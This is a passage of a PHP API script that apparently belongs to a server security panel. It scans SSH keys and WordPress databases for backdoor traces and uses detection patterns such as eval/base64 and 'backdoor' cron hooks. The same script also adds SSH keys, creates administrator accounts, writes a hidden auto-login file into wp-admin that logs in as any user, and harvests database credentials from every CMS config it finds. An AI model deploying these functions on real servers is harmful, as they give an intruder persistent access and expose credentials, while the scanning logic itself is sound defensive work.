                $threat = !$isKnown && !preg_match('/^(ssh-rsa|ssh-ed25519|ecdsa-sha2|ssh-dss)$/', $keyType) ? false : !$isKnown;
                $keys[] = ['idx' => $idx, 'type' => 'key', 'key_type' => $keyType, 'comment' => $comment, 'known_service' => $isKnown, 'threat' => $threat, 'fingerprint' => substr(md5($line), 0, 12), 'length' => strlen($line)];
                $idx++;
            }
        }
        // Check for ELF binaries disguised in .ssh/ subdirs (GSocket hidden as id_rsa)
        $elfThreats = [];
        if (is_dir($sshDir)) {
            try {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sshDir, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($it as $f) {
                    if (!$f->isFile() || $f->getSize() < 1000)
                        continue;
                    $hdr = @file_get_contents($f->getPathname(), false, null, 0, 4);
                    if ($hdr === "\x7fELF") {
                        $elfThreats[] = ['path' => $f->getPathname(), 'size' => $f->getSize(), 'type' => 'ELF binary disguised in .ssh/'];
                    }
                }
            } catch (\Exception $e) {
            }
        }
        $r['ssh_dir'] = $sshDir;
        $r['ssh_exists'] = is_dir($sshDir);
        $r['files'] = $keyFiles;
        $r['keys'] = $keys;
        $r['elf_threats'] = $elfThreats;
        $r['total_keys'] = count(array_filter($keys, function ($k) {
            return $k['type'] === 'key';
        }));
        $r['threat_keys'] = count(array_filter($keys, function ($k) {
            return !empty($k['threat']);
        })) + count($elfThreats);
        $r['known_keys'] = count(array_filter($keys, function ($k) {
            return !empty($k['known_service']);
        }));
    } elseif ($api === 'ssh_remove_key') {
        $idx = intval($_POST['key_idx'] ?? -1);
        $akFile = "$home/.ssh/authorized_keys";
        if ($idx >= 0 && file_exists($akFile)) {
            $lines = file($akFile, FILE_IGNORE_NEW_LINES);
            if (isset($lines[$idx])) {
                unset($lines[$idx]);
                file_put_contents($akFile, implode("\n", $lines) . "\n");
                $r['removed'] = $idx;
            }
        }
    } elseif ($api === 'ssh_add_key') {
        $newKey = trim($_POST['new_key'] ?? '');
        $akFile = "$home/.ssh/authorized_keys";
        if ($newKey) {
            if (!is_dir("$home/.ssh")) {
                @mkdir("$home/.ssh", 0700, true);
            }
            @file_put_contents($akFile, $newKey . "\n", FILE_APPEND);
            @chmod($akFile, 0600);
            $r['added'] = true;
        }
    } elseif ($api === 'scan_wp_db') {
        // WordPress Database Security Audit
        // Detect: fake admins, duplicate users, application passwords abuse,
        // hidden users, eval in options, deactivated security plugins, open registration
        $wpLoadPaths = [];
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        if ($docRoot)
            $wpLoadPaths[] = "$docRoot/wp-load.php";
        if (is_dir("$home/public_html"))
            $wpLoadPaths[] = "$home/public_html/wp-load.php";
        $dd = "$home/domains";
        if (is_dir($dd)) {
            foreach (scandir($dd) as $d) {
                if ($d === '.' || $d === '..')
                    continue;
                $p = "$dd/$d/public_html/wp-load.php";
                if (file_exists($p))
                    $wpLoadPaths[] = $p;
            }
        }
        if (is_dir("$home/httpdocs"))
            $wpLoadPaths[] = "$home/httpdocs/wp-load.php";
        if (is_dir("$home/htdocs")) {
            foreach (scandir("$home/htdocs") as $d) {
                if ($d === '.' || $d === '..')
                    continue;
                $p = "$home/htdocs/$d/wp-load.php";
                if (file_exists($p))
                    $wpLoadPaths[] = $p;
            }
        }
        $wpLoadPaths = array_unique($wpLoadPaths);

        $allDomains = [];
        foreach ($wpLoadPaths as $wpLoad) {
            if (!file_exists($wpLoad))
                continue;
            $domKey = basename(dirname($wpLoad));
            if ($domKey === 'public_html') {
                $parent = basename(dirname(dirname($wpLoad)));
                $domKey = ($parent === 'domains') ? basename(dirname(dirname(dirname($wpLoad)))) : ($_SERVER['HTTP_HOST'] ?? 'main');
            }
            $domResult = ['domain' => $domKey, 'wp_path' => dirname($wpLoad), 'threats' => []];

            try {
                // Reset WP state for multi-domain scan
                if (defined('ABSPATH')) {
                    // WP already loaded — use existing connection
                    global $wpdb;
                } else {
                    define('SHORTINIT', true);
                    @require_once($wpLoad);
                    global $wpdb;
                }
                if (!isset($wpdb) || !$wpdb) {
                    $domResult['error'] = 'DB not available';
                    $allDomains[] = $domResult;
                    continue;
                }

                $prefix = $wpdb->prefix ?: 'wp_';

                // 1. Total users + admin count
                $totalUsers = (int) $wpdb->get_var("SELECT COUNT(*) FROM {$prefix}users");
                $adminCount = (int) $wpdb->get_var("SELECT COUNT(DISTINCT u.ID) FROM {$prefix}users u INNER JOIN {$prefix}usermeta um ON u.ID = um.user_id WHERE um.meta_key = '{$prefix}capabilities' AND um.meta_value LIKE '%administrator%'");
                $domResult['total_users'] = $totalUsers;
                $domResult['admin_count'] = $adminCount;
                if ($adminCount > 10) {
                    $domResult['threats'][] = ['type' => 'excessive_admins', 'severity' => 'high', 'detail' => "$adminCount administrator accounts (normal: 1-5)"];
                }

                // 2. Duplicate usernames (should NEVER happen — means direct DB injection)
                $dupes = $wpdb->get_results("SELECT user_login, COUNT(*) as cnt FROM {$prefix}users GROUP BY user_login HAVING cnt > 1 ORDER BY cnt DESC LIMIT 10");
                foreach ($dupes as $d) {
                    $domResult['threats'][] = ['type' => 'duplicate_username', 'severity' => 'critical', 'detail' => "Username '{$d->user_login}' has {$d->cnt} duplicates — direct DB injection bypass"];
                }

                // 3. Recently created admin accounts (last 30 days)
                $recentAdmins = $wpdb->get_results("SELECT u.ID, u.user_login, u.user_email, u.user_registered FROM {$prefix}users u INNER JOIN {$prefix}usermeta um ON u.ID = um.user_id WHERE um.meta_key = '{$prefix}capabilities' AND um.meta_value LIKE '%administrator%' AND u.user_registered > DATE_SUB(NOW(), INTERVAL 30 DAY) ORDER BY u.user_registered DESC LIMIT 20");
                foreach ($recentAdmins as $a) {
                    $domResult['threats'][] = ['type' => 'recent_admin', 'severity' => 'medium', 'detail' => "Admin '{$a->user_login}' ({$a->user_email}) created {$a->user_registered}"];
                }

                // 4. Application passwords count (mass creation = bot attack)
                $appPwdCount = (int) $wpdb->get_var("SELECT COUNT(*) FROM {$prefix}usermeta WHERE meta_key = '_application_passwords'");
                if ($appPwdCount > 10) {
                    $domResult['threats'][] = ['type' => 'mass_app_passwords', 'severity' => 'critical', 'detail' => "$appPwdCount users have application passwords (normal: 0-5) — possible API abuse"];
                }
                $domResult['app_password_count'] = $appPwdCount;

                // 5. Hidden users (wp_hidden_user meta — used by mu-plugin backdoors)
                $hidden = $wpdb->get_results("SELECT user_id, meta_value FROM {$prefix}usermeta WHERE meta_key = 'wp_hidden_user'");
                foreach ($hidden as $h) {
                    $hu = $wpdb->get_row("SELECT user_login, user_email FROM {$prefix}users WHERE ID = {$h->user_id}");
                    $domResult['threats'][] = ['type' => 'hidden_user', 'severity' => 'critical', 'detail' => "Hidden admin user ID {$h->user_id}" . ($hu ? " ({$hu->user_login} / {$hu->user_email})" : '')];
                }

                // 6. Eval/base64 in wp_options (stored malicious code)
                $malOpts = $wpdb->get_results("SELECT option_name, LENGTH(option_value) as len FROM {$prefix}options WHERE option_name NOT LIKE '%transient%' AND option_name NOT LIKE 'wf_%' AND option_name NOT LIKE 'sucuri%' AND (option_value LIKE '%eval(base64_decode%' OR option_value LIKE '%eval(gzinflate%' OR option_value LIKE '%eval(str_rot13%')");
                foreach ($malOpts as $o) {
                    $domResult['threats'][] = ['type' => 'malicious_option', 'severity' => 'critical', 'detail' => "Option '{$o->option_name}' ({$o->len} bytes) contains eval/base64 code"];
                }

                // 7. Check default_role and users_can_register
                $defaultRole = $wpdb->get_var("SELECT option_value FROM {$prefix}options WHERE option_name = 'default_role'");
                $canRegister = $wpdb->get_var("SELECT option_value FROM {$prefix}options WHERE option_name = 'users_can_register'");
                if ($defaultRole === 'administrator') {
                    $domResult['threats'][] = ['type' => 'dangerous_default_role', 'severity' => 'critical', 'detail' => "default_role is 'administrator' — any new registration gets admin access!"];
                }
                if ($canRegister === '1' && in_array($defaultRole, ['administrator', 'editor'])) {
                    $domResult['threats'][] = ['type' => 'open_registration_elevated', 'severity' => 'high', 'detail' => "Registration open with default_role='$defaultRole'"];
                }
                $domResult['default_role'] = $defaultRole;
                $domResult['users_can_register'] = $canRegister;

                // 8. Deactivated security plugins check
                $activePlugins = $wpdb->get_var("SELECT option_value FROM {$prefix}options WHERE option_name = 'active_plugins'");
                $active = @unserialize($activePlugins) ?: [];
                $secPlugins = [
                    'ninjafirewall' => 'NinjaFirewall',
                    'wordfence' => 'Wordfence',
                    'sucuri-scanner' => 'Sucuri',
                    'ithemes-security' => 'iThemes Security',
                    'all-in-one-wp-security' => 'AIOS',
                ];
                $wpContentDir = dirname($wpLoad) . '/wp-content/plugins';
                foreach ($secPlugins as $slug => $name) {
                    $pluginDir = "$wpContentDir/$slug";
                    if (is_dir($pluginDir)) {
                        $isActive = false;
                        foreach ($active as $ap) {
                            if (strpos($ap, "$slug/") === 0) {
                                $isActive = true;
                                break;
                            }
                        }
                        if (!$isActive) {
                            $domResult['threats'][] = ['type' => 'security_plugin_deactivated', 'severity' => 'high', 'detail' => "$name is installed but DEACTIVATED — possible attacker action"];
                        }
                    }
                }

                // 9. Suspicious cron hooks (dst_update, filester, random paths)
                $cronVal = $wpdb->get_var("SELECT option_value FROM {$prefix}options WHERE option_name = 'cron'");
                $cron = @unserialize($cronVal) ?: [];
                $suspHooks = [];
                foreach ($cron as $ts => $hooks) {
                    if (!is_array($hooks))
                        continue;
                    foreach ($hooks as $hook => $v) {
                        if (preg_match('/^dst_update_|^filester_|eval|base64|shell|backdoor/i', $hook)) {
                            $suspHooks[] = $hook;
                        }
                    }
                }
                foreach ($suspHooks as $sh) {
                    $domResult['threats'][] = ['type' => 'suspicious_cron_hook', 'severity' => 'high', 'detail' => "WP Cron hook: '$sh'"];
                }

            } catch (\Exception $e) {
                $domResult['error'] = $e->getMessage();
            }

            $allDomains[] = $domResult;
            break; // SHORTINIT only works once — scan first WP found
        }

        $r['domains'] = $allDomains;
        $r['total_threats'] = array_sum(array_map(function ($d) {
            return count($d['threats'] ?? []);
        }, $allDomains));
        $r['wp_found'] = count($allDomains) > 0;

    } elseif ($api === 'wp_list_users') {
        $wpLoadPaths = [];
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        if ($docRoot)
            $wpLoadPaths[] = "$docRoot/wp-load.php";
        if (is_dir("$home/public_html"))
            $wpLoadPaths[] = "$home/public_html/wp-load.php";
        $wpLoad = null;
        foreach ($wpLoadPaths as $p) {
            if (file_exists($p)) {
                $wpLoad = $p;
                break;
            }
        }
        if (!$wpLoad) {
            $r['ok'] = false;
            $r['error'] = 'WordPress not found';
            echo json_encode($r);
            exit;
        }
        if (!defined('ABSPATH')) {
            define('SHORTINIT', true);
            @require_once($wpLoad);
        }
        global $wpdb;
        $prefix = $wpdb->prefix ?: 'wp_';
        $page = max(1, intval($_POST['page'] ?? 1));
        $perPage = min(50, max(10, intval($_POST['per_page'] ?? 20)));
        $role = $_POST['role'] ?? 'administrator';
        $offset = ($page - 1) * $perPage;

        $totalAll = (int) $wpdb->get_var("SELECT COUNT(*) FROM {$prefix}users");
        if ($role === 'all') {
            $total = $totalAll;
            $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_registered FROM {$prefix}users ORDER BY ID DESC LIMIT $perPage OFFSET $offset");
        } else {
            $total = (int) $wpdb->get_var($wpdb->prepare("SELECT COUNT(DISTINCT u.ID) FROM {$prefix}users u INNER JOIN {$prefix}usermeta um ON u.ID = um.user_id WHERE um.meta_key = %s AND um.meta_value LIKE %s", "{$prefix}capabilities", "%{$role}%"));
            $users = $wpdb->get_results($wpdb->prepare("SELECT DISTINCT u.ID, u.user_login, u.user_email, u.user_registered FROM {$prefix}users u INNER JOIN {$prefix}usermeta um ON u.ID = um.user_id WHERE um.meta_key = %s AND um.meta_value LIKE %s ORDER BY u.ID DESC LIMIT $perPage OFFSET $offset", "{$prefix}capabilities", "%{$role}%"));
        }

        $result = [];
        foreach ($users as $u) {
            $caps = $wpdb->get_var($wpdb->prepare("SELECT meta_value FROM {$prefix}usermeta WHERE user_id = %d AND meta_key = %s", $u->ID, "{$prefix}capabilities"));
            $roles = [];
            $capArr = @unserialize($caps);
            if (is_array($capArr))
                $roles = array_keys($capArr);
            $appPwd = (int) $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM {$prefix}usermeta WHERE user_id = %d AND meta_key = '_application_passwords'", $u->ID));
            $flags = [];
            $dupeCount = (int) $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM {$prefix}users WHERE user_login = %s", $u->user_login));
            if ($dupeCount > 1)
                $flags[] = 'duplicate';
            $hidden = $wpdb->get_var($wpdb->prepare("SELECT meta_value FROM {$prefix}usermeta WHERE user_id = %d AND meta_key = 'wp_hidden_user'", $u->ID));
            if ($hidden)
                $flags[] = 'hidden';
            $regTime = strtotime($u->user_registered);
            if ($regTime && (time() - $regTime) < 7 * 86400)
                $flags[] = 'recent';
            $result[] = [
                'id' => (int) $u->ID,
                'login' => $u->user_login,
                'email' => $u->user_email,
                'registered' => $u->user_registered,
                'roles' => $roles,
                'app_passwords' => $appPwd,
                'flags' => $flags,
            ];
        }

        $adminCount = (int) $wpdb->get_var($wpdb->prepare("SELECT COUNT(DISTINCT u.ID) FROM {$prefix}users u INNER JOIN {$prefix}usermeta um ON u.ID = um.user_id WHERE um.meta_key = %s AND um.meta_value LIKE %s", "{$prefix}capabilities", "%administrator%"));
        $appPwdTotal = (int) $wpdb->get_var("SELECT COUNT(*) FROM {$prefix}usermeta WHERE meta_key = '_application_passwords'");
        $defaultRole = $wpdb->get_var("SELECT option_value FROM {$prefix}options WHERE option_name = 'default_role'");
        $canRegister = $wpdb->get_var("SELECT option_value FROM {$prefix}options WHERE option_name = 'users_can_register'");
        $dupeUsers = $wpdb->get_results("SELECT user_login, COUNT(*) as cnt FROM {$prefix}users GROUP BY user_login HAVING cnt > 1 ORDER BY cnt DESC LIMIT 5");

        $r['users'] = $result;
        $r['page'] = $page;
        $r['per_page'] = $perPage;
        $r['total'] = $total;
        $r['total_pages'] = ceil($total / $perPage);
        $r['total_all_users'] = $totalAll;
        $r['admin_count'] = $adminCount;
        $r['app_pwd_total'] = $appPwdTotal;
        $r['default_role'] = $defaultRole;
        $r['users_can_register'] = $canRegister;
        $r['duplicates'] = $dupeUsers;

    } elseif ($api === 'wp_delete_users') {
        $ids = $_POST['user_ids'] ?? [];
        if (!is_array($ids))
            $ids = json_decode($ids, true) ?: [];
        $ids = array_map('intval', $ids);
        $ids = array_filter($ids, function ($id) {
            return $id > 1;
        });
        if (empty($ids)) {
            $r['ok'] = false;
            $r['error'] = 'No valid user IDs (cannot delete ID 1)';
            echo json_encode($r);
            exit;
        }
        $wpLoadPaths = [];
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        if ($docRoot)
            $wpLoadPaths[] = "$docRoot/wp-load.php";
        if (is_dir("$home/public_html"))
            $wpLoadPaths[] = "$home/public_html/wp-load.php";
        $wpLoad = null;
        foreach ($wpLoadPaths as $p) {
            if (file_exists($p)) {
                $wpLoad = $p;
                break;
            }
        }
        if (!$wpLoad) {
            $r['ok'] = false;
            $r['error'] = 'WordPress not found';
            echo json_encode($r);
            exit;
        }
        if (!defined('ABSPATH')) {
            define('SHORTINIT', true);
            @require_once($wpLoad);
        }
        global $wpdb;
        $prefix = $wpdb->prefix ?: 'wp_';
        $deleted = 0;
        foreach ($ids as $uid) {
            $wpdb->delete("{$prefix}usermeta", ['user_id' => $uid]);
            $del = $wpdb->delete("{$prefix}users", ['ID' => $uid]);
            if ($del)
                $deleted++;
        }
        $r['deleted'] = $deleted;
        $r['requested'] = count($ids);

    } elseif ($api === 'wp_add_user') {
        $username = trim($_POST['username'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $password = $_POST['password'] ?? '';
        $role = $_POST['role'] ?? 'administrator';
        if (!$username || !$email || !$password) {
            $r['ok'] = false;
            $r['error'] = 'Username, email, and password required';
            echo json_encode($r);
            exit;
        }
        $wpLoadPaths = [];
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        if ($docRoot)
            $wpLoadPaths[] = "$docRoot/wp-load.php";
        if (is_dir("$home/public_html"))
            $wpLoadPaths[] = "$home/public_html/wp-load.php";
        $wpLoad = null;
        foreach ($wpLoadPaths as $p) {
            if (file_exists($p)) {
                $wpLoad = $p;
                break;
            }
        }
        if (!$wpLoad) {
            $r['ok'] = false;
            $r['error'] = 'WordPress not found';
            echo json_encode($r);
            exit;
        }
        if (!defined('ABSPATH')) {
            @require_once($wpLoad);
        }
        $uid = wp_create_user($username, $password, $email);
        if (is_wp_error($uid)) {
            $r['ok'] = false;
            $r['error'] = $uid->get_error_message();
            echo json_encode($r);
            exit;
        }
        $u = new WP_User($uid);
        $u->set_role($role);
        $r['user_id'] = $uid;
        $r['username'] = $username;

    } elseif ($api === 'wp_bulk_delete') {
        $pattern = trim($_POST['pattern'] ?? '');
        $field = $_POST['field'] ?? 'user_login';
        $preview = !empty($_POST['preview']);
        if (!$pattern) {
            $r['ok'] = false;
            $r['error'] = 'Pattern required';
            echo json_encode($r);
            exit;
        }
        if (!in_array($field, ['user_login', 'user_email']))
            $field = 'user_login';
        $wpLoadPaths = [];
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        if ($docRoot)
            $wpLoadPaths[] = "$docRoot/wp-load.php";
        if (is_dir("$home/public_html"))
            $wpLoadPaths[] = "$home/public_html/wp-load.php";
        $wpLoad = null;
        foreach ($wpLoadPaths as $p) {
            if (file_exists($p)) {
                $wpLoad = $p;
                break;
            }
        }
        if (!$wpLoad) {
            $r['ok'] = false;
            $r['error'] = 'WordPress not found';
            echo json_encode($r);
            exit;
        }
        if (!defined('ABSPATH')) {
            define('SHORTINIT', true);
            @require_once($wpLoad);
        }
        global $wpdb;
        $prefix = $wpdb->prefix ?: 'wp_';
        $count = (int) $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM {$prefix}users WHERE $field = %s AND ID > 1", $pattern));
        if ($preview) {
            $r['count'] = $count;
            $r['pattern'] = $pattern;
            $r['field'] = $field;
        } else {
            $userIds = $wpdb->get_col($wpdb->prepare("SELECT ID FROM {$prefix}users WHERE $field = %s AND ID > 1", $pattern));
            $deleted = 0;
            foreach ($userIds as $uid) {
                $wpdb->delete("{$prefix}usermeta", ['user_id' => $uid]);
                $del = $wpdb->delete("{$prefix}users", ['ID' => $uid]);
                if ($del)
                    $deleted++;
            }
            $r['deleted'] = $deleted;
            $r['pattern'] = $pattern;
        }

    } elseif ($api === 'wp_auto_login') {
        $uid = intval($_POST['user_id'] ?? 0);
        if ($uid < 1) {
            $r['ok'] = false;
            $r['error'] = 'Invalid user ID';
            echo json_encode($r);
            exit;
        }
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        $wpDir = '';
        if ($docRoot && file_exists("$docRoot/wp-load.php"))
            $wpDir = $docRoot;
        elseif (is_dir("$home/public_html") && file_exists("$home/public_html/wp-load.php"))
            $wpDir = "$home/public_html";
        if (!$wpDir) {
            $r['ok'] = false;
            $r['error'] = 'WordPress not found';
            echo json_encode($r);
            exit;
        }
        $token = bin2hex(random_bytes(24));
        $loginFile = "$wpDir/wp-admin/.ual-$token.php";
        $phpCode = '<?php' . "\n"
            . 'require_once dirname(__DIR__) . "/wp-load.php";' . "\n"
            . '$t = basename(__FILE__, ".php");' . "\n"
            . '$exp = ' . (time() + 120) . ';' . "\n"
            . 'if (time() > $exp) { @unlink(__FILE__); wp_die("Token expired"); }' . "\n"
            . 'wp_set_auth_cookie(' . $uid . ', true);' . "\n"
            . 'wp_set_current_user(' . $uid . ');' . "\n"
            . '@unlink(__FILE__);' . "\n"
            . 'wp_redirect(admin_url()); exit;' . "\n";
        if (@file_put_contents($loginFile, $phpCode) === false) {
            $r['ok'] = false;
            $r['error'] = 'Cannot write login file';
            echo json_encode($r);
            exit;
        }
        @chmod($loginFile, 0644);
        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
        $r['url'] = "$scheme://$host/wp-admin/.ual-$token.php";
        $r['expires'] = 120;
        $r['user_id'] = $uid;

    } elseif ($api === 'cms_users') {
        $cmsAction = $_POST['cms_action'] ?? 'list';
        $cmsType   = trim($_POST['cms_type'] ?? '');
        $cmsRoot   = rtrim(trim($_POST['cms_root'] ?? ''), '/\\');

        // ── Helper: scan for CMS instances ────────────────────────────
        $findCmsInstances = function() use ($home) {
            $roots = [];
            $webSubs = ['public_html','httpdocs','htdocs','www','web','html'];
            // 1. DOCUMENT_ROOT (always)
            $dr = $_SERVER['DOCUMENT_ROOT'] ?? '';
            if ($dr && is_dir($dr)) $roots[] = $dr;
            // 2. $home/public_html, $home/httpdocs, etc. (all, not just first)
            foreach ($webSubs as $sub) {
                $p = "$home/$sub";
                if (is_dir($p)) $roots[] = $p;
            }
            // 3. $home/domains/*/public_html + $home/subdomains/*
            foreach (["$home/domains", "$home/subdomains"] as $dBase) {
                if (!is_dir($dBase)) continue;
                foreach (@scandir($dBase) ?: [] as $d) {
                    if ($d === '.' || $d === '..') continue;
                    $found = false;
                    foreach ($webSubs as $sub) {
                        $pp = "$dBase/$d/$sub";
                        if (is_dir($pp)) { $roots[] = $pp; $found = true; break; }
                    }
                    if (!$found && is_dir("$dBase/$d") && strpos($d, '.') !== false)
                        $roots[] = "$dBase/$d";
                }
            }
            // 4. ISPmanager/Beget: $home/www/domain.com/
            if (is_dir("$home/www")) {
                foreach (@scandir("$home/www") ?: [] as $d) {
                    if ($d === '.' || $d === '..' || !is_dir("$home/www/$d")) continue;
                    if (strpos($d, '.') !== false) $roots[] = "$home/www/$d";
                }
            }
            // 5. 1&1/IONOS: $home/htdocs/sitename/
            if (is_dir("$home/htdocs")) {
                foreach (@scandir("$home/htdocs") ?: [] as $d) {
                    if ($d === '.' || $d === '..' || !is_dir("$home/htdocs/$d")) continue;
                    if (!in_array($d, ['logs', 'htaccess-backup', 'leer', 'vmfiles']))
                        $roots[] = "$home/htdocs/$d";
                }
            }
            // 6. VPS: /var/www/domain.com/ or /var/www/domain.com/public_html
            if (is_dir('/var/www')) {
                foreach (@scandir('/var/www') ?: [] as $d) {
                    if ($d === '.' || $d === '..' || !is_dir("/var/www/$d")) continue;
                    if (in_array($d, ['html', 'logs', 'cache', 'vhosts', 'cgi-bin'])) continue;
                    if (strpos($d, '.') !== false) {
                        foreach (['public_html', 'httpdocs', 'htdocs', 'web', 'html'] as $sub) {
                            if (is_dir("/var/www/$d/$sub")) { $roots[] = "/var/www/$d/$sub"; break; }
                        }
                        $roots[] = "/var/www/$d";
                    }
                }
            }
            // 7. Plesk VPS: /var/www/vhosts/domain.com/httpdocs
            if (is_dir('/var/www/vhosts')) {
                foreach (@scandir('/var/www/vhosts') ?: [] as $d) {
                    if ($d === '.' || $d === '..' || !is_dir("/var/www/vhosts/$d")) continue;
                    if (strpos($d, '.') !== false) {
                        if (is_dir("/var/www/vhosts/$d/httpdocs")) $roots[] = "/var/www/vhosts/$d/httpdocs";
                        elseif (is_dir("/var/www/vhosts/$d/public_html")) $roots[] = "/var/www/vhosts/$d/public_html";
                        else $roots[] = "/var/www/vhosts/$d";
                    }
                }
            }
            // 8. Single VPS: /var/www/html
            if (is_dir('/var/www/html')) $roots[] = '/var/www/html';

            $roots = array_values(array_unique(array_filter($roots, 'is_dir')));
            $domLabel = function($root) {
                $bn = basename($root);
                if (in_array($bn, ['public_html','httpdocs','htdocs','www','web','html'])) {
                    $parent = basename(dirname($root));
                    if ($parent && !in_array($parent, ['.','..',get_current_user(),'domains','subdomains','vhosts']))
                        return $parent;
                    return $parent ?: $bn;
                }
                return $bn;
            };
            $instances = [];
            $seen = [];
            foreach ($roots as $root) {
                $dl = $domLabel($root);
                $rk = realpath($root) ?: $root;
                if (isset($seen[$rk])) continue;
                $seen[$rk] = true;
                // WordPress
                if (file_exists("$root/wp-config.php"))
                    $instances[] = ['type'=>'wordpress','root'=>$root,'label'=>"WordPress @ $dl"];
                // Joomla
                if (file_exists("$root/configuration.php")) {
                    $c = @file_get_contents("$root/configuration.php", false, null, 0, 3000);
                    if ($c && (strpos($c, 'JConfig') !== false || strpos($c, '$dbprefix') !== false))
                        $instances[] = ['type'=>'joomla','root'=>$root,'label'=>"Joomla @ $dl"];
                }
                // Laravel (artisan + .env with APP_KEY)
                if (file_exists("$root/artisan") && file_exists("$root/.env")) {
                    $env = @file_get_contents("$root/.env", false, null, 0, 2000);
                    if ($env && strpos($env, 'APP_KEY') !== false) {
                        $appName = 'Laravel';
                        if (preg_match('/^APP_NAME\s*=\s*"?([^"\n]+)/m', $env, $nm))
                            $appName = trim($nm[1], "\" \t");
                        $instances[] = ['type'=>'laravel','root'=>$root,'label'=>"Laravel ($appName) @ $dl"];
                    }
                }
                // Laravel inside public/ — check parent
                if (file_exists("$root/../artisan") && file_exists("$root/../.env")) {
                    $parentRoot = realpath("$root/..");
                    $prk = $parentRoot ?: "$root/..";
                    if (!isset($seen[$prk])) {
                        $env = @file_get_contents("$parentRoot/.env", false, null, 0, 2000);
                        if ($env && strpos($env, 'APP_KEY') !== false) {
                            $seen[$prk] = true;
                            $appName = 'Laravel';
                            if (preg_match('/^APP_NAME\s*=\s*"?([^"\n]+)/m', $env, $nm))
                                $appName = trim($nm[1], "\" \t");
                            $instances[] = ['type'=>'laravel','root'=>$parentRoot,'label'=>"Laravel ($appName) @ $dl"];
                        }
                    }
                }
                // OpenCart
                if (file_exists("$root/config.php") && (file_exists("$root/system/startup.php") || file_exists("$root/system/engine/action.php"))) {
                    $c = @file_get_contents("$root/config.php", false, null, 0, 1500);
                    if ($c && strpos($c, 'DB_DATABASE') !== false)
                        $instances[] = ['type'=>'opencart','root'=>$root,'label'=>"OpenCart @ $dl"];
                }
                // Drupal
                if (file_exists("$root/sites/default/settings.php")) {
                    $c = @file_get_contents("$root/sites/default/settings.php", false, null, 0, 3000);
                    if ($c && strpos($c, '$databases') !== false)
                        $instances[] = ['type'=>'drupal','root'=>$root,'label'=>"Drupal @ $dl"];
                }
                // PrestaShop
                if (file_exists("$root/app/config/parameters.php") || file_exists("$root/config/settings.inc.php"))
                    $instances[] = ['type'=>'prestashop','root'=>$root,'label'=>"PrestaShop @ $dl"];
            }
            return $instances;
        };

        // ── Helper: parse DB credentials from CMS config ───────────────
        $parseDb = function($type, $root) {
            $db = ['host'=>'localhost','name'=>'','user'=>'','pass'=>'','prefix'=>''];
            $ex = function($key,$c) { $qk=preg_quote($key,'/'); if(preg_match('/define\s*\(\s*[\'"]'.$qk.'[\'"]\s*,\s*\'([^\']*)\'/i',$c,$m)) return $m[1]; if(preg_match('/define\s*\(\s*[\'"]'.$qk.'[\'"]\s*,\s*"([^"]*)"/i',$c,$m)) return $m[1]; return ''; };
            $jex = function($field,$c) { preg_match('/(?:public|var)\s+\\\$'.$field.'\s*=\s*\'([^\']*)\'/i',$c,$m); if(!isset($m[1])) preg_match('/(?:public|var)\s+\\\$'.$field.'\s*=\s*"([^"]*)"/i',$c,$m); return $m[1]??''; };
            // Bedrock .env parser — look up to 4 parent dirs for .env with DB_NAME
            $bedrockEnv = function($startDir) {
                $dir = $startDir;
                for ($i = 0; $i < 5; $i++) {
                    $envFile = "$dir/.env";
                    if (file_exists($envFile)) {
                        $c = @file_get_contents($envFile);
                        if ($c && strpos($c, 'DB_NAME') !== false) return $c;
                    }
                    $parent = dirname($dir);
                    if ($parent === $dir) break;
                    $dir = $parent;
                }
                return null;
            };
            $envGet = function($key, $envContent, $default = '') {
                if (preg_match('/^' . preg_quote($key, '/') . '\s*=\s*["\']?([^"\'\r\n]*)["\']?/m', $envContent, $m))
                    return trim($m[1]);
                return $default;
            };
            if ($type==='wordpress') {
                $c=@file_get_contents("$root/wp-config.php"); if(!$c) {
                    // Try parent dirs (Bedrock: web/wp/wp-config.php might not exist, check bedrock root)
                    foreach ([dirname($root), dirname(dirname($root)), dirname(dirname(dirname($root)))] as $pd) {
                        if (file_exists("$pd/wp-config.php")) { $c=@file_get_contents("$pd/wp-config.php"); break; }
                    }
                }
                if(!$c) return null;
                $db['host']=$ex('DB_HOST',$c); $db['name']=$ex('DB_NAME',$c); $db['user']=$ex('DB_USER',$c); $db['pass']=$ex('DB_PASSWORD',$c);
                preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/i",$c,$pm); $db['prefix']=$pm[1]??'wp_';
                // Bedrock: wp-config uses env() — parse .env file instead
                if (!$db['name'] || strpos($c, "env('DB_NAME')") !== false || strpos($c, 'env(') !== false) {
                    $envContent = $bedrockEnv($root);
                    if ($envContent) {
                        $db['host'] = $envGet('DB_HOST', $envContent, 'localhost');
                        $db['name'] = $envGet('DB_NAME', $envContent);
                        $db['user'] = $envGet('DB_USER', $envContent);
                        $db['pass'] = $envGet('DB_PASSWORD', $envContent);
                        $pfx = $envGet('DB_PREFIX', $envContent, '');
                        if ($pfx) $db['prefix'] = $pfx;
                    }
                }
            } elseif ($type==='joomla') {
                $c=@file_get_contents("$root/configuration.php"); if(!$c) return null;
                $db['host']=$jex('host',$c); $db['name']=$jex('db',$c); $db['user']=$jex('user',$c); $db['pass']=$jex('password',$c); $db['prefix']=$jex('dbprefix',$c)?:'jos_';
            } elseif ($type==='opencart') {
                $c=@file_get_contents("$root/config.php"); if(!$c) return null;
                $db['host']=$ex('DB_HOSTNAME',$c); $db['name']=$ex('DB_DATABASE',$c); $db['user']=$ex('DB_USERNAME',$c); $db['pass']=$ex('DB_PASSWORD',$c); $db['prefix']=$ex('DB_PREFIX',$c)?:'oc_';
            } elseif ($type==='drupal') {
